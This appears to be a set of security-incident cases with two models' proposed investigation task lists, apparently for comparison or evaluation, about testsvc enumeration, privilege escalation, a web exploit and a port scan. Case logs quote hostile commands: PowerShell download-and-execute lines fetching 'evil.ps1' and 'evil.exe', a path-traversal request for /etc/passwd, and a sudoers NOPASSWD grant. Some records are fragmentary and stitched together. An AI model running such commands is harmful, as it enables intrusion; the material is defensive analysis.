Filter the 200 random A‑record queries for unused subdomains. Check for patterns such as systematically incremented hostnames, uncommon TLDs, or domain suffixes that deviate from production naming conventions. Correlate with the testsvc activity window. Flag any groups or clusters of queries that could indicate DNS tunneling or reconnaissance.

---

**Task #6**  
**Title:** Examine PowerShell execution records for enumeration commands  
**Description:**  
Audit all PowerShell events (4688) on the workstation, focusing on “Get‑ADUser –Filter *” and “Get‑ADComputer –Filter *”. Retrieve the script block and the full command line parameters. Determine if these commands were issued manually or scheduled. Validate the PowerShell execution policy and any scripts persisted to disk that could facilitate further enumeration.

---

**Task #7**  
**Title:** Review 4662 object‑access audit logs for potentials exfiltration  
**Description:**  
Pull all object‑access (4662) events for the workstation’s session. Identify read/write permissions to shared document folders. Check for any unusual read volumes or access during odd hours. The goal is to uncover whether the workstation is copying data that might constitute exfiltration, or simply gathering metadata.

---

**Task #8**  
**Title:** Verify that no persistence mechanism is present on the workstation  
**Description:**  
Search for scheduled tasks, services, registry run keys, and startup folders related to testsvc or the PowerShell scripts. Use Windows Task Scheduler (schtasks) and the registry keys (HKLM\Software\Microsoft\Windows\CurrentVersion\Run, HKCU...). Absence of a legitimate persistence mechanism should prompt isolation or remediation of the account.

---

**Task #9**  
**Title:** Cross‑correlate enumeration tactics with MITRE ATT&CK techniques  
**Description:**  
Map the observed activities to ATT&CK tactics (Account Discovery T1087, Remote System Discovery T1018, SMB/Windows Admin Shares T1077). Compile a correlation matrix that lists each technique, the associated logs, and the confidence level. This aids in prioritizing responses and preparing a threat model.

---

**Task #10**  
**Title:** Contain and remediate potential malicious activity  
**Description:**  
If the investigation confirms that testsvc or the workstation is engaged in unauthorized enumeration, quarantine the device (disable network interface or place in a separate VLAN). Remove or disable testsvc’s credentials, enforce least privilege, and reset passwords. Initiate a forensic timeline to capture volatile memory and disk evidence. Follow organizational incident response procedures and document findings for audit and reporting.
model_b_tasks:
Task #1  
Title: Verify the legitimacy and privileges of the testsvc account  
Description: Retrieve Active Directory attributes for testsvc, including account creation and last password change dates, group memberships (especially Domain Admins, Enterprise Admins, and Account Operators), and any SPN registrations. Cross‑reference with internal provisioning tickets, change management records, and documentation to confirm if the account is intentionally active and within its approved privilege scope. If the account is undocumented or holds excessive rights, disable it immediately and reset its password.

---

Task #2  
Title: Assess the security posture of workstation 10.2.3.4  
Description: Compile and review security event logs from the workstation for signs of anomalous behavior: frequent Process Creation (4688) events involving known lateral movement tools (PsExec, WMI, PowerShell), unusual account names in command lines, creation of hidden files or runs scripts at startup via Registry Run keys or Scheduled Tasks. Inspect Endpoint Detection & Response (EDR) data for malicious binaries, persistence mechanisms, or unauthorized credential storage. Verify that the system is patched and its anti‑malware signature database is up‑to‑date.

---

Task #3  
Title: Aggregate SMB share enumeration details from domain controllers  
Description: Parse SMB logs for SMB2_COMMAND_QUERY_INFO requests issued by 10.2.3.4 to each domain controller. Produce a list of all shares queried, the timestamps and frequency of queries, and the relative depth of folder enumeration performed. Compare the set of shares returned against those that are logically accessible to the testsvc account’s group memberships. Flag any attempts to enumerate hidden shares (e.g., `::$S`) or administrative shares like `C$` performed by the testsvc account.

---

Task #4  
Title: Correlate SMB traffic with NetFlow outbound data  
Description: Map NetFlow flows on TCP/UDP port 445 from 10.2.3.4 to domain controllers onto SMB log events. Identify large-volume sessions and any SMB Write or Session Setup events that could indicate file staging or exfiltration. Pay particular attention to transfer sizes significantly larger than what would be expected for metadata enumeration. If suspicious payloads are detected, perform deeper packet inspection on captured traffic for evidence of exfiltration or data staging.

---

Task #5  
Title: Investigate random DNS queries for unused subdomains  
Description: Compile a list of all A‑record lookup events from 10.2.3.4 that resolved to non‑existent or unused subdomains within the internal DNS zone. Use threat intelligence feeds to match these subdomains against known malicious DNS productions or domain generation algorithm (DGA) signatures. If any matched, block resolution for those domains and notify the network perimeter team for heightened monitoring.

---

Task #6  
Title: Audit PowerShell command execution for domain enumeration  
Description: Scrutinize event 4688 logs for executions of `Get-ADUser –Filter *` and `Get-ADComputer –Filter *` on 10.2.3.4. Verify the caller session ID, the originating script path, and whether command argument obfuscation was applied. If Script Block Logging is enabled, review event 4104 logs for the exact PowerShell command content. Cross‑reference any retrieved user or computer objects against the list of accounts explicitly authorized for enumeration tasks.

---

Task #7  
Title: Cross‑reference object access audit logs for sensitive share activity  
Description: Parse event 4662 logs produced when testsvc accessed shared folders. Identify read, write, delete, or ACE modification operations, along with the security principal performing each action. Determine if any of the accessed folders contain sensitive or restricted data that the testsvc account should not ordinarily be viewing. Flag unauthorized write or modify ACE events for immediate review.

---

Task #8  
Title: Examine failed logon attempts to privileged domain accounts  
Description: Review event 4625 logs for authentication failures from 10.2.3.4 targeting privileged accounts (e.g., Domain Admins, Enterprise Admins). Determine if these failures represent automated password‑spraying attempts by aggregating event counts per username across short intervals. Enforce account lockout thresholds for accounts that fall below policy or flag for additional investigation if unusual patterns emerge.

---

Task #9  
Title: Validate that testsvc account lacks unauthorized persistence mechanisms  
Description: Search for hidden services, scheduled tasks, or registry startup entries created by or associated with testsvc. Inspect the “Services” tab in SCF for services with the testsvc account listed as the service principal. Check the “Task Scheduler Library” for tasks running under testsvc that are not documented in change management. If persistence is found, document the mechanism, assess its impact, and recommend removal.

---

Task #10  
Title: Correlate testsvc activity with Group Policy and delegation changes  
Description: Examine Event 4732/4733 logs for any addition or removal of testsvc from privileged AD groups (Domain Admins, Enterprise Admins, Account Operators). Inspect Event 4731 logs for GPO modifications where testsvc or a group it belongs to was granted rights to edit or apply GPOs to OU scopes that include domain controllers or infrastructure servers. Assess whether such changes were justified or represent a privilege escalation attempt.

---

Task #11  
Title: Run threat intelligence lookup for indicators associated with testsvc enumeration  
Description: Submit extracted artifacts—such as PowerShell command strings, SMB file paths accessed, DNS subdomains queried, and any resulting malware hashes—to commercial threat intelligence services (VirusTotal, CrowdStrike, Recorded Future). Check whether the testsvc enumeration pattern or specific vulnerabilities (e.g., SMB signing bypass) correlate with known APT campaigns or malware families. case_title: Possible privilege escalation attempt detected via SMB exploitation and sudo misconfiguration on corporate endpoints.
case_description: Artifacts: • Windows Security Event ID 4670 – permissions on C:\Windows\System32\config\system changed at 2023‑11‑20 08:12:34. • Windows Security Event ID 4725 – user JDOE disabled during same timeframe. • Sysmon event 1 – Process creation: C:\Windows\System32\cmd.exe /c cacls.exe C:\Windows\System32\config\system /e:1 ALL. • Sysmon event 6 – Duplicate PID 5796 session flagged. • Windows SMB logs – host 192.168.5.23 attempted NTLM hash extraction (exploit‑xcache). • Linux auditd log – type=SYSCALL uid=1000 session=5 key=sudo indicating sudo usage by ordinary user. • /etc/sudoers modification – timestamp 2023‑11‑21 13:45:32, user JDOE appended as NOPASSWD: ALL. • PowerShell invocation – powershell.exe -NoProfile -ExecutionPolicy Bypass -command Invoke-Expression (New-Object System.Net.WebClient).DownloadString('http://malicious.com/evil.ps1'). • File creation – /tmp/.tmp1234.exe, 5 KB, created by JDOE, executed with root privileges. • Network: Port 445 traffic from host 10.0.1.45 to shared folder, repeated authentication attempts. • Network: Outbound HTTP traffic from 10.0.2.56 to external IP 203.0.113.42 on port 80 carrying payload.exe. Observations: • User JDOE repeatedly attempts to modify critical system files despite lacking admin rights. • Unapproved elevation attempts on both Windows domain and local workstation environments. • Unauthorized scripts executed with root/system privileges. • Unexpected cmd.exe and sudo usage clusters observed. • SMB authentication anomalies and netsh-based IP configuration changes. • Unusual modifications in Windows registry key HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment.
model_a_tasks:
Task #1
Title: Construct a unified incident timeline across Windows and Linux endpoints.
Description: Collate timestamps from Windows Security Events 4670, 4725, Sysmon events 1 and 6, SMB logs, Linux auditd records, and the modification of /etc/sudoers. Align these events chronologically to identify the sequence of privilege escalation attempts and pinpoint the earliest indication of compromise.

Task #2
Title: Verify unauthorized ACL changes on C:\Windows\System32\config\system.
Description: Review the audited ACL modifications (Event 4670) and compare them to the baseline permissions that belong to system users. Determine which user or process performed the change and assess whether the new permissions align with legitimate administrative actions.

Task #3
Title: Confirm that cacls.exe usage was malicious.
Description: Investigate the Sysmon event showing cmd.exe /c cacls.exe altering system permissions. Correlate the command with the process owner (JDOE) and the timeline to establish if this was an intentional exploit rather than a legitimate maintenance task.

Task #4
Title: Examine SMB logs for exploit‑xcache NTLM hash extraction activity.
Description: Filter SMB logs from host 192.168.5.23 for all authentication attempts flagged as exploit‑xcache. Capture any NTLM hash traffic and compare hash values to known legitimate credentials to assess whether the attacker was extracting password hashes.

Task #5
Title: Validate the state and privileges of user JDOE on all impacted hosts.
Description: Identify who disabled JDOE (Event 4725) and whether they re-enabled the account later. Check JDOE’s group memberships, confirm current privileges, and audit any actions that required administrative rights over the timeline of the incident.

Task #6
Title: Audit the /etc/sudoers modification for root access grant.
Description: Examine the change to /etc/sudoers dated 2023‑11‑21 13:45:32; verify that JDOE was added with NOPASSWD: ALL. Cross‑reference auditd logs for corresponding sudo syscalls to confirm whether sudo was used to run commands as root.

Task #7
Title: Correlate Linux sudo usage with potential escalation.
Description: Analyze the auditd syscall entries for uid=1000 with key=sudo to understand the exact commands invoked. Determine if any of these commands could have allowed JDOE to modify system files or install malicious binaries as root.

Task #8
Title: Investigate the PowerShell script download from malicious.com.
Description: Capture the HTTP response from malicious.com and extract evil.ps1. Perform static analysis on the script to identify its intentions (e.g., download further payloads, persistence, credential theft) and confirm whether it was executed by a non‑admin user.

Task #9
Title: Verify existence and execution of /tmp/.tmp1234.exe on Linux.
Description: Search the filesystem for the exact file path, verify its creation time, owner, and integrity hash. Use process accounting logs or a memory forensic tool to confirm that the binary was launched with root privileges and understand its subsequent actions.

Task #10
Title: Analyze outbound HTTP traffic to 203.0.113.42 on port 80.
Description: Capture the complete HTTP session from 10.0.2.56 and download the payload.exe. Run static and dynamic malware analysis to determine its purpose, check for credential dumping or remote command and control capabilities, and verify whether it connects back to the attacker’s IP.

Task #11
Title: Investigate Sysmon duplicate PID 5796 event for hidden processes.
Description: Query the system for any process instances that were assigned PID 5796 during the flagged time. Look for inconsistencies in process names, owners, and file paths that could indicate process masquerading or PID hijacking.

Task #12
Title: Verify unauthorized changes to environment registry key.
Description: Review HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment for any recent additions or modifications. Compare these entries to a known clean baseline to detect potential persistence hooks or alterations of system startup behavior.

Task #13
Title: Enumerate persistence mechanisms on the compromised host.
Description: Search for new scheduled tasks, services, startup folders, crontabs, or at jobs that were created after the incident date. Correlate these items with other malicious activity to assess whether they provide backdoor access or maintain elevated privileges.

Task #14
Title: Examine netsh-based IP configuration changes for covert channels.
Description: Retrieve netsh and network configuration logs around the time of the incident to identify any IP address, DNS, or routing changes. Determine if an attacker altered the host’s network settings to facilitate lateral movement or hide traffic.

Task #15
Title: Review domain controller logs for suspicious account or privilege modifications.
Description: Inspect domain‑wide audit logs for any changes to privileged groups, addition or removal of admin accounts, or abnormal authentication events. Validate that no domain‑level privileges were abused or that new elevated accounts were created by the attacker.

Task #2

Description: Analyze Sysmon event 1 detailing cmd.exe invocation with cacls.exe doing permission elevation on C:\Windows\System32\config\system. Task #4  
Title: Analyze Duplicate PID 5796 Sysmon Event

Task #5

Determine commands executed with elevated privileges, frequency of use, and whether sudo rules legitimately allow JDOE all-access or if misconfiguration enabled privilege escalation.

Task #7  
Title: Audit /etc/sudoers Modification Attribution  
Description: Verify the source of the /etc/sudoers change made at 2023‑11‑21 13:45:32 that appended JDOE as NOPASSWD: ALL. Check file modification history, associated sudoers.d entries, user permissions on /etc/sudoers, and review system logs for editing sessions or unauthorized access.

Task #8  
Title: Inspect PowerShell Script Download from Malicious Domain  
Description: Deconstruct the PowerShell command that bypassed execution policy to invoke a download from http://malicious.com/evil.ps1. Identify the network traffic associated with the request, the actual script content, and any subsequent payload execution or persistence mechanisms driven by the script.

Task #9  
Title: Examine /tmp/.tmp1234.exe Creation and Execution  
Description: Assess the context in which /tmp/.tmp1234.exe, a 5 KB binary created by JDOE, was launched and gained root privileges. Perform static and dynamic analysis of the executable, check file integrity against clean baselines, and determine if it establishes persistence or exfiltration channels.

Task #10  
Title: Investigate SMB Traffic from 10.0.1.45 – Authentication Attempts  
Description: Profile port 445 traffic originating from host 10.0.1.45 to shared folders, focusing on repeated authentication attempts. Identify usernames attempted, success/failure status, source/destination paths, and evaluate whether these attempts stemmed from legitimate users or compromised machines.

Task #11  
Title: Trace Outbound HTTP Traffic to 203.0.113.42 – Payload Delivery  
Description: Map the outbound HTTP session from 10.0.2.56 to external IP 203.0.113.42 delivering payload.exe. Capture packet payloads, request headers, and response status codes, and link the download source to the PowerShell command or other execution paths observed on the system.

Task #12  
Title: Assess Unusual Windows Registry Key Modifications  
Description: Examine changes to HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment key during the alert period. Identify new values added, altered environment variables exported to user sessions, and their potential role in persistence, privilege escalation, or covering tracks.

Task #13  
Title: Scrutinize netsh Base IP Configuration Modifications  
Description: Inspect network interface configurations applied via netsh commands for unauthorized IP changes, routes, or DNS updates. Correlate with timestamps near privilege escalation attempts to detect potential preparations for lateral movement or remote access.

Task #14  
Title: Compile Timeline of Privilege Escalation Events  
Description: Construct a detailed chronological sequence from Windows permission changes, JDOE disablement, Sysmon logs, SMB hash extraction, Linux sudo use, to PowerShell script execution and file drops. Use timestamps and overlapping activities to illustrate the chain of compromise and identify temporal gaps for further probing.

Task #15  
Title: Correlate Credentials Dumped via SMB to Linux Access  
Description: Match NTLM hashes extracted by 192.168.5.23 with credentials found on Linux systems (e.g., JDOE’s sudo records, /etc/shadow entries). Determine if the attacker leveraged Windows-to-Linux lateral movement, whether JDOE’s elevation on Linux originated from Windows exploitation, and assess the scope of account compromise.

case_description: WAF log entry (2023‑09‑15 14:23:19 UTC): blocked POST to `/admin/login?cmd=../../../../etc/passwd` from source IP `203.0.113.45`; IDS alert (2023‑09‑15 14:23:20 UTC): potential SQL injection and CVE‑2023‑2367 exploitation attempt flagged; Firewall log (2023‑09‑15 14:23:22 UTC): outbound TLS connection from internal host `10.10.20.5` to external IP `203.0.113.45` on port 443 established and terminated; Sysmon ProcessCreate on host `10.10.20.5` (2023‑09‑15 14:23:25 UTC): `cmd.exe /c powershell -nop -c "(New-Object Net.WebClient).DownloadFile('https://203.0.113.45/evil.exe','C:\\Temp\\evil.exe')"`; File creation event on host `10.10.20.5`: file `C:\\Temp\\evil.exe` created (size 3.2 MB, SHA‑256 `...`); Endpoint AV detection (2023‑09‑15 14:23:30 UTC): malicious executable flagged on `10.10.20.5` (incident ID `AV-9876`); Registry modification observed on host `10.10.20.5`: key `HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\EnableLUA` set to `0`; DNS query log (2023‑09‑15 14:23:33 UTC): host `10.10.20.5` queried `malicious.com`; suspicious PowerShell script execution (`fetch.ps1`) logged on host `10.10.20.5` at 2023‑09‑15 14:23:35 UTC; outbound HTTP request from host `10.10.20.5` to `http://203.0.113.45/taint.py` logged with status code 200; log entry from Windows Security (2023‑09‑15 14:23:40 UTC): successful logon (event ID 4624) of user `Administrator` via network from IP `203.0.113.45`; RDP session established from the same external IP to internal host `10.10.20.5` (source port 5985, destination 5985).

case_title: Outbound port scanning activity detected from corporate workstation 10.0.5.4 targeting multiple external servers on TCP ports 22-443.
case_description:
- Firewall log entry: 2026-03-10 02:12:07, source 10.0.5.4 → destination 203.0.113.202, protocol TCP, dest port 22, action ALLOW.  
- Firewall log entry: 2026-03-10 02:12:10, source 10.0.5.4 → destination 203.0.113.202, protocol TCP, dest port 80, action ALLOW.  
- IDS alert (Snort ID 10021 "TCP SYN Scan") at 2026-03-10 02:12:15, src IP 10.0.5.4, dst IP 203.0.113.202, flagged port range 1‑1000.  
- NetFlow record: 10,204 flows from 10.0.5.4 to 203.0.113.202/26 between 02:10 and 02:12, total bytes 3.5 MB.  
- Windows Event Log on host 10.0.5.4: Event ID 4688, process nmap.exe started 2026-03-10 02:11:55 by user svc_probe.  
- Syslog entry: 2026-03-10 02:12:05, alarm: "unauthorized port scan activity detected, source 10.0.5.4" emitted by security appliance.
model_a_tasks:
Task #1  
Title: Cross‑correlate firewall, IDS, NetFlow, and host logs to confirm the scan  
Description: Align timestamps from the firewall entries (02:12:07 and 02:12:10), the Snort alert (02:12:15), and the NetFlow record (02:10–02:12). Verify that all logs point to the same source (10.0.5.4) and destination subnet (203.0.113.0/24). Ensure that the IDS flag of a TCP SYN scan matches the flow volume in NetFlow, confirming that the activity was not a false positive.

---

Task #2  
Title: Compile a complete list of scanned destinations and ports  
Description: Extract every destination IP and port from the firewall and IDS logs, and aggregate them with the NetFlow data to produce a matrix of scanned targets. Highlight any unusual port ranges or repeated target IPs that may indicate a focused attack or a reconnaissance mission.

---

Task #3  
Title: Validate the legitimacy of the nmap.exe process  
Description: Inspect the file path, digital signature, and version of nmap.exe on host 10.0.5.4. Determine whether the binary matches a known legitimate distribution (e.g., from Nmap.org) or an altered, potentially malicious version. Check if the svc_probe account has an authorized audit or vulnerability‑scanning role.

---

Task #4  
Title: Determine whether the scan was authorized by policy  
Description: Search internal documentation and authorization records for any scheduled scan involving host 10.0.5.4. Verify that the activity aligns with the corporate security team’s scanning policies and that svc_probe was granted privilege to perform external scans. If no authorization exists, treat the action as a policy violation.

---

Task #5  
Title: Assess host 10.0.5.4 for indications of compromise  
Description: Run full antivirus and malware scans, conduct memory‑forensic analysis, and review event logs (Security, System, Application) for indicators such as scheduled tasks, registry persistence keys, or unusual outbound connections after the scan. Flag any suspicious modifications or persistence mechanisms.

---

Task #6  
Title: Temporarily block outbound traffic from 10.0.5.4 to external networks  
Description: Deploy a short‑term firewall rule dropping all outbound TCP traffic from 10.0.5.4 to the 203.0.113.0/24 subnet and other external ranges, while preserving critical services. Monitor the rule to ensure no legitimate business traffic is inadvertently blocked.

---

Task #7  
Title: Preserve forensic evidence from the workstation  
Description: Acquire a bit‑exact disk image and a memory dump from 10.0.5.4, collect all system logs (Windows, Sysmon, WMI), and preserve timestamps. Maintain chain of custody documentation and store evidence in a secure, write‑once repository for future analysis.

---

Task #8  
Title: Review compliance with internal security policies  
Description: Compare the discovered scanning activity against the organization’s policy on outbound port scanning. Document any gaps, update policy documentation if necessary, and, if the action violates policy, log a formal compliance complaint.

---

Task #9  
Title: Investigate potential lateral movement following the scan  
Description: Examine logs for RDP, SMB, or other remote connections originating from 10.0.5.4 to internal IPs. Search for credential‑dumping tools, suspicious PowerShell scripts, or new user accounts created after the scanning window.

---

Task #10  
Title: Implement remediation, report findings, and close the case  
Description: Patch the host if required, disable or re‑configure the svc_probe account, and enforce stricter outbound‑scan monitoring. Notify IT security, compliance, and management of the findings, attach evidence, and update the SOAR case with resolution steps. Schedule a post‑incident review to prevent recurrence.
model_b_tasks:
Task #1  
Title: Capture full traffic packet traces for 10.0.5.4 during suspected scan window  
Description: Direct the network tap or switch to export a 2‑minute packet capture starting at 02:10 from host 10.0.5.4 to IP ranges observed (e.g., 203.0.113.0/24). Save the pcap to your evidence repository for detailed protocol analysis and nmap script detection.

Task #2  
Title: Retrieve nmap.exe execution context from host 10.0.5.4  
Description: Pull the Windows System Center or native event logs for Event ID 4688 entries around 02:10‑02:12, noting the full command line, start time, parent process, and token user. Verify if the command line includes scanning options (`-p1-443`, `--top-ports`, etc.) and check for scheduled task or service creation related to nmap.

Task #3  
Title: Verify legitimacy of user svc_probe and account activity  
Description: Query Active Directory to confirm svc_probe’s group memberships, role, last successful authentication time, and any unusual password change activity. Cross‑reference with the 02:10‑02:15 timeframe for other outbound connections from the account.

Task #4  
Title: Correlate scan target IP and subnet with threat intelligence  
Description: Lookup 203.0.113.202 and the /26 block in commercial and open source threat intel feeds for known scanning infrastructures, malware distribution nodes, or other malicious associations. Document any matches and prioritize further analysis if the block is flagged as high‑risk.

Task #5  
Title: Conduct comprehensive host forensic imaging of 10.0.5.4  
Description: Use a live‑forensic tool (e.g., FTK Imager, Guymager) to create a bit‑exact clone of the workstation while noting system state. Preserve volatile memory snapshot, running processes, services list, and relevant logs to maintain chain of custody.

Task #6  
Title: Scan host 10.0.5.4 for persistence mechanisms and malware signatures  
Description: Run up‑to‑date antivirus, anti‑malware, and rootkit scanners (e.g., Windows Defender ATP checks, Malwarebytes, Rootkit Hunter) against the forensic image. Examine system startup points, scheduled tasks, custom services, registry Run keys, and presence of malicious binaries or injected DLLs.

Task #7  
Title: Isolate host 10.0.5.4 from production network pending remediation  
Description: Push network ACL changes or smart‑device isolation commands to block all outbound traffic from 10.0.5.4 to external networks, particularly 203.0.113.0/24. Notify relevant O&M staff and schedule safe return to normal operations post-cleanup.

Task #8  
Title: Interview stakeholders to clarify lawful nmap usage policies  
Description: Speak with system administrators, security compliance lead, and the svc_probe account owner to understand if scheduled compliance scans or penetration tests justify the observed activity. Request documentation of planned scans, approvals, and scope boundaries.

Task #9  
Title: Update intrusion detection and firewall rules to prevent future port scans  
Description: Add nmap signature (e.g., Snort ID 10021 “TCP SYN Scan” patterns) to the IDS rule set and tighten outbound firewall policies to enforce perimeter outbound scanning restrictions. Log any new scan attempts post-update for ongoing monitoring.

Task #10  
Title: Document incident findings and remediation actions  
Description: Compile a comprehensive incident report detailing timeline, evidence collected, root cause analysis, containment steps, forensic findings, and recommended policy or configuration changes. Submit the report to SOC management and affected stakeholders, and schedule a follow‑up review to confirm remediation efficacy.
